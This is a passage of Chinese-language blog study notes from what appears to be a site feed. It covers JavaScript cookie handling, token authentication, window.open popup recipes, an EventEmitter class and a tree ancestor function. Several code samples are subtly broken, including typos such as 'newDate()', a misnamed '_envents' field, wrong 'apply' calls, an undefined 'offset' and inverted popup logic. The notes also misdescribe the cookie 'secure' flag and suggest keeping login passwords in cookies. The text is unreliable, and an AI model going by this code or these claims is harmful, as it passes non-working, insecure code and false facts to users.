以后会把它存储起来，比如放在 cookie 里或者 localStorage 里</li><li>客户端每次发送请求时都需要带着服务端签发的 token（把 token 放到 HTTP 的 Header 里）</li><li>服务端收到请求后，需要验证请求里带有的 token ，如验证成功则返回对应的数据</li></ol><h1 id="js如何获取-禁用cookie"><a href="#js如何获取-禁用cookie" class="headerlink" title="js如何获取/禁用cookie"></a>js如何获取/禁用cookie</h1><h2 id="js如何获取cookies"><a href="#js如何获取cookies" class="headerlink" title="js如何获取cookies"></a>js如何获取cookies</h2><p>假设cookie中存储的内容为：name=jack;password=123，则在B页面中获取变量username的值的JS代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arusername=document.cookie.split(&quot;;&quot;)[0].split(&quot;=&quot;)[1];</span><br><span class="line">//JS操作cookies方法!</span><br><span class="line">//写cookies</span><br><span class="line">function setCookie(name,value)&#123;</span><br><span class="line">var Days = 30;</span><br><span class="line">var exp =newDate();</span><br><span class="line">exp.setTime(exp.getTime() + Days*24*60*60*1000);</span><br><span class="line">document.cookie = name +&quot;=&quot;+ escape (value) +&quot;;expires=&quot;+ exp.toGMTString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//读取cookies</span><br><span class="line">function getCookie(name)&#123;</span><br><span class="line">var arr,reg=new RegExp(&quot;(^| )&quot;+name+&quot;=([^;]*)(;|$)&quot;);</span><br><span class="line">if(arr=document.cookie.match(reg))</span><br><span class="line">return unescape(arr[2]);</span><br><span class="line">else</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="cookie-是什么？"><a href="#cookie-是什么？" class="headerlink" title="cookie 是什么？"></a>cookie 是什么？</h2><ul><li>cookie 是存储于访问者计算机中的变量。每当一台计算机通过浏览器来访问某个页面时，那么就可以通过 JavaScript 来创建和读取 cookie。</li><li>实际上 cookie 是<font color="#FF8C00">存于用户硬盘的一个文件，这个文件通常对应于一个域名，当</font>浏览器再次访问这个域名时，便使这个cookie可用。因此，cookie可以跨越一个域名下的多个网页，但不能跨越多个域名使用。</li><li>不同浏览器对 cookie 的实现也不一样。即保存在一个浏览器中的 cookie 到另外一个浏览器是 不能获取的。</li></ul><p><strong>PS：cookie 和 session 都能保存计算机中的变量，但是 session 是运行在服务器端的，而客户端我们只能通过 cookie 来读取和创建变量</strong></p><h2 id="cookie-能做什么？"><a href="#cookie-能做什么？" class="headerlink" title="cookie 能做什么？"></a>cookie 能做什么？</h2><ul><li>用户在第一次登录某个网站时，要输入用户名密码，如果觉得很麻烦，下次登录时不想输入了，那么就在第一次登录时将登录信息存放在 cookie 中。下次登录时我们就可以直接获取 cookie 中的用户名密码来进行登录。</li></ul><p>PS:虽然 浏览器将信息保存<strong>在 cookie 中是加密了，但是可能还是会造成不安全的信息泄露</strong></p><ul><li>类似于购物车性质的功能，第一次用户将某些商品放入购物车了，但是临时有事，将电脑关闭了，下次再次进入此网站，我们可以通过读取 cookie 中的信息，恢复购物车中的物品。</li></ul><p>PS：实际操作中，这种方法很少用了，基本上都是将这些信息存储在数据库中。然后通过查询数据库的信息来恢复购物车里的物品</p><ul><li>页面之间的传值。在实际开发中，我们往往会通过一个页面跳转到另外一个页面。<strong>后端服务器我们可以通过数据库，session 等来传递页面所需要的值。但是在浏览器端，我们可以将数据保存在 cookie 中，然后在另外页面再去获取 cookie 中的数据。</strong></li></ul><p>PS：<font color="#FF8C00">这里要注意 cookie 的时效性，不然会造成获取 cookie 中数据的混乱。</font></p><h2 id="怎么使用-cookie？"><a href="#怎么使用-cookie？" class="headerlink" title="怎么使用 cookie？"></a>怎么使用 cookie？</h2><ol><li>语法<br>document.cookie = “name=value;expires=evalue; path=pvalue; domain=dvalue; secure;”</li></ol><p><strong>name=value 必选参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&quot;name=中文&quot;;</span><br><span class="line">//为了防止中文乱码，我们可以使用encodeURIComponent()编码；decodeURIComponent()解码</span><br><span class="line">document.cookie = encodeURIComponent(&quot;name&quot;)+&quot;=&quot;+encodeURIComponent(&quot;中文&quot;);</span><br></pre></td></tr></table></figure><ol start="2"><li>expires=evalue 可选参数</li></ol><p>该对象的有效时间（可选）只支持GTM 标准时间，即要将时间转换，toUTCString()（默认为当前浏览器 会话有用，关闭浏览器就消失）;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var date = new Date(); 　</span><br><span class="line">date.setTime(date.getTime()+2000);//获取当前时间并加上 2 秒钟 　</span><br><span class="line">alert(date.toUTCString());//格林威治时间 (GMT) 把 Date 对象转换为字符串，并返回结果</span><br><span class="line">alert(date.toGMTString());//与上面的结果一样，但是这个方法已经被上面取代了 </span><br><span class="line">document.cookie=&quot;name=vae;expires=&quot;+date.toUTCString(); </span><br><span class="line">alert(document.cookie); // name=vae 　</span><br><span class="line">setTimeout(function()&#123;alert(document.cookie)&#125;,4000);//4 秒后打印空的字符串</span><br></pre></td></tr></table></figure><ol start="3"><li>path=pvalue 可选参数</li></ol><p><strong>限制访问 cookie 的目录，默认情况下对于当前网页所在的同一目录下的所有页面有效</strong></p><ol start="4"><li>domain=dvalue 可选参数</li></ol><p><strong>用于限制只有设置了的域名才可以访问；如果没有设置，则默认在当前域名访问</strong><br>比如设置 test.com 表示域名为test.com的服务器共享该Cookie</p><ol start="5"><li>secure=true|false 可选参数，默认是 true 不安全传输</li></ol><p>安全设置，<font color="#FF8C00">指明必须通过 安全的通信通道来传输（https) 才能获得 cookie,true 不安全，默认值；false 安 全，必须通过 https 来访问</font><br>比如：如果你设置 document.cookie = “name=vae;secure”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">　　　　　　　//设置 cookie</span><br><span class="line">function setCookie(objName, objValue, objHours)&#123;//添加cookie</span><br><span class="line">    var str = objName + &quot;=&quot; + encodeURIComponent(objValue);</span><br><span class="line">    if (objHours &gt; 0) &#123;//为0时不设定过期时间，浏览器关闭时cookie自动消失</span><br><span class="line">        var date = new Date();</span><br><span class="line">        var ms = objHours * 3600 * 1000;</span><br><span class="line">        date.setTime(date.getTime() + ms);</span><br><span class="line">        str += &quot;; expires=&quot; + date.toUTCString();</span><br><span class="line">    &#125;</span><br><span class="line">    document.cookie = str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//获取 cookie</span><br><span class="line">function getCookie(objName)&#123;//获取指定名称的cookie的值</span><br><span class="line">    //多个cookie 保存的时候是以 ;空格  分开的</span><br><span class="line">    var arrStr = document.cookie.split(&quot;; &quot;);</span><br><span class="line">    for (var i = 0; i &lt; arrStr.length; i++) &#123;</span><br><span class="line">        var temp = arrStr[i].split(&quot;=&quot;);</span><br><span class="line">        if (temp[0] == objName)&#123;</span><br><span class="line">            return decodeURIComponent(temp[1]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//为了删除指定名称的cookie，可以将其过期时间设定为一个过去的时间</span><br><span class="line">function delCookie(name)&#123;</span><br><span class="line">    var date = new Date();</span><br><span class="line">    date.setTime(date.getTime() - 10000);</span><br><span class="line">    document.cookie = name + &quot;=a; expires=&quot; + date.toUTCString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong><br>（1）cookie可能被禁用。当用户非常注重个人隐私保护时，他很可能禁用浏览器的cookie功能；<br>（2）cookie是与浏览器相关的。这意味着即使访问的是同一个页面，<font color="#FF8C00">不同浏览器之间所保存的cookie也是不能互相访问的</font>；<br>（3）cookie可能被删除。因为<font color="#FF8C00">每个cookie都是硬盘上的一个文件</font>，因此很有可能被用户删除；<br>（4）cookie安全性不够高。所有的cookie都是以纯文本的形式记录于文件中，因此如果要保存用户名密码等信息时，最好事先经过加密处理。<br>（5）cookie 在保存时，只要后面保存的 name 相同，那么就会<font color="#FF8C00">覆盖</font>前面的 cookie，注意是完全覆盖，包括失效时间，pat</p><h1 id="cookie-禁用"><a href="#cookie-禁用" class="headerlink" title="cookie 禁用"></a>cookie 禁用</h1><p><strong>sessionID通过cookie保存在客户端，如果将cookie禁用，必将对session的使用造成一定的影响。</strong></p><p><strong>解决这个问题的办法是：<font color="#FF8C00">URL重写</font></strong></p><p><strong>URL重写</strong> [TODO]</p><ol><li>servlet中涉及向客户端输出页面元素的时候，可以在相应的请求地址外面包上一层方法，也就是说使用response.encodeURL(“请求地址”);为请求地址添加一个JSESSIONID的值</li><li>servlet中涉及跳转到新的页面时，可以使用response.encodeRedirectURL(“请求地址”);为请求地址添加一个JSESSIONID的值</li></ol><h1 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h1><h2 id="谷歌浏览器自带的调试工具"><a href="#谷歌浏览器自带的调试工具" class="headerlink" title="谷歌浏览器自带的调试工具"></a>谷歌浏览器自带的调试工具</h2><ol><li>Elements：可查看网页页面代码（修改只是当前使用有效），也可实时调试修改页面ccs代码样式。</li><li>console：记录开发者开发过程中的日志信息，也可在里面写js代码。一般页面运行时js报错都是可以在这里看到反馈和定位bug原因及其位置。</li><li>Sources：断点调试JS，可以查看程序代码执行的过程，断点调试对于每一个程序员来说可是很重要。</li><li>Network：从发起网页页面请求开始，分析HTTP请求后得到的各个请求资源信息（“小编有时候就利用这下载一些网站不给下载的在线视频，比如教学视频”）。</li><li>Timeline：记录并分析网站的生命周期所发生的各类事件，分析渲染js执行的每一个阶段。</li><li>Application：记录网站加载的各个资源信息。</li><li>Security：判断网页是否安全。</li><li>Audits：对当前网页的网络利用及网页性能进行检测，并给出一些优化建议。</li></ol><h2 id="Sentry"><a href="#Sentry" class="headerlink" title="Sentry"></a>Sentry</h2><p>地址：<a href="https://sentry.io/welcome/">https://sentry.io/welcome/</a></p><p>无论测试如何完善的程序，bug总是免不了会存在的，有些bug不是每次都会出现，测试时运行好好的代码可能在某个用户使用时就歇菜了，可是当程序在用户面前崩溃时，你是看不到错误的，当然你会说:”Hey, 我有记日志呢”。 但是说实话，程序每天每时都在产生大量的日志，而且分布在各个服务器上，并且如果你有多个服务在维护的话，日志的数量之多你是看不过来的吧。等到某天某个用户实在受不了了，打电话来咆哮的时候，你再去找日志你又会发现日志其实没什么用：缺少上下文，不知道用户什么操作导致的异常，异常太多（从不看日志的缘故）不知如何下手 等等。</p><p>Sentry就是来帮我们解决这个问题的，它是是一个实时事件日志记录和聚合平台。它专门用于监视错误和提取执行适当的事后操作所需的所有信息, 而无需使用标准用户反馈循环的任何麻烦。</p><p>Sentry是一个日志平台, 它分为客户端和服务端，客户端(目前客户端有Python, PHP,C#, Ruby等多种语言)就嵌入在你的应用程序中间，程序出现异常就向服务端发送消息，服务端将消息记录到数据库中并提供一个web节目方便查看。Sentry 由 python 编写，源码开放，性能卓越，易于扩展，目前著名的用户有Disqus, Path, mozilla, Pinterest等。</p><h2 id="BrowserStack"><a href="#BrowserStack" class="headerlink" title="BrowserStack"></a>BrowserStack</h2><p>地址：<a href="https://www.browserstack.com/">https://www.browserstack.com/</a></p><p>现在拥有各自内核的浏览器越来越多，各自的特性也千差万别。如果作为一个前端攻城师想要检测网站在不同的操作系统和移动平台下的各种浏览器的兼容性，那是相当痛苦不堪的。看到有在自己电脑上装虚拟机配置各种环境，有自己的电脑上组建好这样的环境，然后一一测试，可是人的精力毕竟有限，我们没法在同一台电脑上装那么多系统，那么多浏览器的。幸好出了个 BrowserStack 是前端的福音呀。</p><p>BrowserStack 是一款提供网站浏览器兼容性测试的在线云端测试工具，从而开发测试人员不必再准备很多虚拟机或者手机模拟器。</p><p>BrowserStack 是一个提供网站浏览器兼容性测试的在线云端应用，支持9大操作系统上的100多款浏览器。支持本地测试，支持与Visual Studio集成。或者你也可以直接前往 <a href="http://modern.ie/">http://modern.ie</a> 在线测试，现在注册可以免费试用三个月，三个月后是收费的，三个月后要是你想用又不想付费作为天朝的开发者你懂得。</p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>webAPI(第十三天)</title>
    <link href="https://merlynr.github.io/2022/08/09/webAPI(%E7%AC%AC%E5%8D%81%E4%B8%89%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/09/webAPI(%E7%AC%AC%E5%8D%81%E4%B8%89%E5%A4%A9)/</id>
    <published>2022-08-08T16:00:00.000Z</published>
    <updated>2022-08-08T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h1><p><strong>这个方法是用来打开新窗口的</strong></p><ol><li>最基本的弹出窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&#x27;page.html&#x27;);</span><br></pre></td></tr></table></figure><ol start="2"><li>经过设置后的弹出窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">window.open(&#x27;page.html&#x27;, &#x27;newwindow&#x27;, &#x27;height=100, width=400, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no&#x27;)   </span><br><span class="line">  //该句写成一行代码</span><br><span class="line">  //参数解释：</span><br><span class="line">  // window.open 弹出新窗口的命令； </span><br><span class="line">　　//&#x27;page.html&#x27; 弹出窗口的文件名； </span><br><span class="line">　　//&#x27;newwindow&#x27; 弹出窗口的名字（不是文件名），非必须，可用空&#x27;&#x27;代替； </span><br><span class="line">　　//height=100 窗口高度； </span><br><span class="line">　　//width=400 窗口宽度； </span><br><span class="line">　　//top=0 窗口距离屏幕上方的象素值； </span><br><span class="line">　　//left=0 窗口距离屏幕左侧的象素值； </span><br><span class="line">　　//toolbar=no 是否显示工具栏，yes为显示； </span><br><span class="line">　　//menubar，scrollbars 表示菜单栏和滚动栏。 </span><br><span class="line">　　//resizable=no 是否允许改变窗口大小，yes为允许； </span><br><span class="line">　　//location=no 是否显示地址栏，yes为允许； </span><br><span class="line">　　//status=no 是否显示状态栏内的信息（通常是文件已经打开），yes为允许</span><br></pre></td></tr></table></figure><ol start="3"><li>用函数控制弹出窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">　　&lt;head&gt; </span><br><span class="line">　　&lt;script LANGUAGE=&quot;JavaScript&quot;&gt; </span><br><span class="line">　　&lt;!-- </span><br><span class="line">　　function openwin() &#123; </span><br><span class="line">　　window.open (&quot;page.html&quot;, &quot;newwindow&quot;, &quot;height=100, width=400, toolbar =no, menubar=no, scrollbars=no, resizable=no, location=no, status=no&quot;) //写成一行</span><br><span class="line">　　&#125; </span><br><span class="line">　　//--&gt; </span><br><span class="line">　　&lt;/script&gt; </span><br><span class="line">　　&lt;/head&gt; </span><br><span class="line">　　&lt;body οnlοad=&quot;openwin()&quot;&gt; </span><br><span class="line">　　任意的页面内容... </span><br><span class="line">　　&lt;/body&gt; </span><br><span class="line">　　&lt;/html&gt; </span><br></pre></td></tr></table></figure><p><strong>解释：</strong> 这里定义了一个函数openwin(), 函数内容就是打开一个窗口。在调用它之前没有任何用途。怎么调用呢？ 方法一：&lt;body οnlοad=”openwin()”&gt; 浏览器读页面时弹出窗口； 方法二：&lt;body οnunlοad=”openwin()”&gt; 浏览器离开页面时弹出窗口； 方法三：用一个连接调用： &lt;a href=”#” οnclick=”openwin()”&gt; 打开一个窗口 注意：使用的”#”是<font color="#FF00FF">虚连接。</font> 方法四：用一个按扭调用： &lt;input type=”button” οnclick=”openwin()” value=”打开窗口” /&gt;</p><ol start="4"><li>弹出两个窗口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script LANGUAGE=&quot;JavaScript&quot;&gt; </span><br><span class="line">　　&lt;!-- </span><br><span class="line">　　function openwin() &#123; </span><br><span class="line">　　window.open (&quot;page.html&quot;, &quot;newwindow&quot;, &quot;height=100, width=100, top=0, left=0,toolbar=no, menubar=no, scrollbars=no, resizable=no, location=n o, status=no&quot;)//写成一行 </span><br><span class="line">　　window.open (&quot;page2.html&quot;, &quot;newwindow2&quot;, &quot;height=100, width=100, top=100, left=100,toolbar=no, menubar=no, scrollbars=no, resizable=no, loca tion=no, status=no&quot;)//写成一行 </span><br><span class="line">　　&#125; </span><br><span class="line">　　//--&gt; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>为<strong>避免弹出的2个窗口覆盖</strong>，用top和left控制一下弹出的位置不要相互覆盖即可。最后用上面的说过的四种方法调用即可。 <font color="#FF8C00">注意：2个窗口的name(newwindow与 newwindow2)不要相同，或者干脆全部为空。</font></p><ol start="5"><li>主窗口打开文件1.htm，同时弹出小窗口page.html</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function openwin()&#123;</span><br><span class="line">    window.open(&quot;page.html&quot;,&quot;&quot;,&quot;width=200,height=200&quot;) </span><br><span class="line">&#125;</span><br><span class="line">   //加入body区：</span><br><span class="line">&lt;a href=&quot;1.htm&quot; οnclick=&quot;openwin()&quot;&gt;open&lt;/a&gt;即可。</span><br></pre></td></tr></table></figure><ol start="6"><li>弹出的窗口之定时关闭控制</li></ol><p>将一小段代码加入弹出的页面（注意是加入page.html的HTML中，可不是主页面中，否则……），让它在10秒后自动关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function closeit()&#123;</span><br><span class="line">   setTimeout(&quot;self.close()&quot;, 10000)   //毫秒</span><br><span class="line">&#125;</span><br><span class="line">&lt;body οnlοad=&quot;closeit()&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="7"><li>在弹出窗口中加上一个关闭按扭</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;关闭&quot; οnclick=&quot;window.close()&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="8"><li>内包含的弹出窗口—一个页面两个窗口</li></ol><p>内包含的弹出窗口—一个页面两个窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">　　&lt;head&gt; </span><br><span class="line">　　&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt; </span><br><span class="line">　　function openwin() </span><br><span class="line">　　&#123; </span><br><span class="line">　　OpenWindow=window.open(&quot;&quot;, &quot;newwin&quot;, &quot;height=250, width=250,toolbar=no ,scrollbars=&quot;+scroll+&quot;,menubar=no&quot;); </span><br><span class="line">　　//写成一行 </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;TITLE&gt;例子&lt;/TITLE&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;BODY BGCOLOR=#ffffff&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;h1&gt;Hello!&lt;/h1&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;New window opened!&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;/BODY&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.write(&quot;&lt;/HTML&gt;&quot;) </span><br><span class="line">　　OpenWindow.document.close() </span><br><span class="line">　　&#125; </span><br><span class="line">　　&lt;/SCRIPT&gt; </span><br><span class="line">　　&lt;/head&gt; </span><br><span class="line">　　&lt;body&gt; </span><br><span class="line">　　&lt;a href=&quot;#&quot; οnclick=&quot;openwin()&quot;&gt;打开一个窗口&lt;/a&gt; </span><br><span class="line">　　&lt;input type=&quot;button&quot; οnclick=&quot;openwin()&quot; value=&quot;打开窗口&quot;&gt; </span><br><span class="line">　　&lt;/body&gt; </span><br><span class="line">　　&lt;/html&gt; </span><br></pre></td></tr></table></figure><ol start="9"><li>终极应用—弹出的窗口这Cookie控制</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> function openwin()&#123; </span><br><span class="line">　　window.open(&quot;page.html&quot;,&quot;&quot;,&quot;width=200,height=200&quot;) </span><br><span class="line"> &#125; </span><br><span class="line"> function get_cookie(Name)&#123;</span><br><span class="line">    var search=Name+&quot;=&quot;;</span><br><span class="line">    var returnvalue=&quot;&quot;;</span><br><span class="line">    if(document.cookie.length&gt;0)&#123;</span><br><span class="line">　　    if (offset != -1) &#123; </span><br><span class="line">　　      offset += search.length </span><br><span class="line">　　      end = document.cookie.indexOf(&quot;;&quot;, offset); </span><br><span class="line">　　      if (end == -1) </span><br><span class="line">　　       end = document.cookie.length; </span><br><span class="line">　　        returnvalue=unescape(document.cookie.substring(offset, end));</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return returnvalue;</span><br><span class="line"> &#125;</span><br><span class="line"> function ladpopup()&#123;</span><br><span class="line">    if(get_cookie(&#x27;popped=yes&#x27;))&#123;</span><br><span class="line">      openwin()</span><br><span class="line">      document.cookie=&quot;popped=yes&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实现-Eventemitter-类，有on、emit、off-方法"><a href="#实现-Eventemitter-类，有on、emit、off-方法" class="headerlink" title="实现 Eventemitter 类，有on、emit、off 方法"></a>实现 Eventemitter 类，有on、emit、off 方法</h1><ol><li>on(event,fn)：监听event事件，事件触发时调用fn函数；</li><li>once(event,fn)：为指定事件注册一个单次监听器，单次监听器最多只触发一次，触发后立即解除监听器；</li><li>emit(event,arg1,arg2,arg3…)：触发event事件，并把参数arg1,arg2,arg3….传给事件处理函数；</li><li>off(event,fn)：停止监听某个事件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class EventEmitter &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this._envents = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on(event, callback) &#123;</span><br><span class="line">    //监听event事件，触发时调用callback函数</span><br><span class="line">    let callbacks = this._events[event] || [];</span><br><span class="line">    callbacks.push(callback);</span><br><span class="line">    this._events[event] = callbacks;</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">  off(event, callback) &#123;</span><br><span class="line">    //停止监听event事件</span><br><span class="line">    let callbacks = this._events[event];</span><br><span class="line">    this._events[event] =</span><br><span class="line">      callbacks &amp;&amp; callbacks.filter((fn) =&gt; fn !== callback);</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">  emit(...args) &#123;</span><br><span class="line">    //触发事件，并把参数传给事件的处理函数</span><br><span class="line">    const event = args[0];</span><br><span class="line">    const params = [].slice.call(args, 1);</span><br><span class="line">    const callbacks = this._events[event];</span><br><span class="line">    callbacks.forEach((fn) =&gt; fn.apply(this.params));</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">  once(event, callback) &#123;</span><br><span class="line">    //为事件注册单次监听器</span><br><span class="line">    let wrapFanc = (...args) =&gt; &#123;</span><br><span class="line">      callback.apply(this.args);</span><br><span class="line">      this.off(event, wrapFanc);</span><br><span class="line">    &#125;;</span><br><span class="line">    this.on(event, wrapFanc);</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="查找给定的两个节点的第一个公共父节点"><a href="#查找给定的两个节点的第一个公共父节点" class="headerlink" title="查找给定的两个节点的第一个公共父节点"></a>查找给定的两个节点的第一个公共父节点</h1><p>递归循环树的节点，因二叉树不能重复的特性,当前节点为 p or q ，返回当前节点 父节点循环中，如果找到一个，则查找其他子树 其他子树没有找到另外一个，就证明当前节点为找到的子树是最近公共祖先 两个都找到了，对应当前节点是两个节点的父节点这种情况，则返回当前节点。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var lowestCommonAncestor = function(root, p, q) &#123;</span><br><span class="line">if (!root || root === p || root === q) return root</span><br><span class="line">    let left = lowestCommonAncestor(root.left, p, q)</span><br><span class="line">    let right = lowestCommonAncestor(root.right, p, q)</span><br><span class="line">    if (!left) return right</span><br><span class="line">    if (!right) return left</span><br><span class="line">    return root</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
